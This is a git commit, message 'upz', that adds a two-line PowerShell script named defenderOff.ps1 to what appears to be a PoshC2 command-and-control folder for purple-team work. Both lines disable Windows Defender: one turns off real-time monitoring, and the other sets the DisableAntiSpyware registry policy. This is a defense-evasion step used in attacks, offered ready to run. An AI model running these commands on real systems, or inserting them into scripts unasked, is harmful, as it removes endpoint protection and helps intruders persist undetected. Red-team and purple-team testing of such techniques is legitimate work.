8968b8a2e7a044a2347cb30b2c653b2e7a43ca74
Anthony Marroquin <jaunwashere7@gmail.com>
2022-10-04 14:17:37 -0400

    upz

---
+++ Poshc2/pslo_scripts/Purple_pslo_scripts/defenderOff.ps1
@@ -0,0 +1,2 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
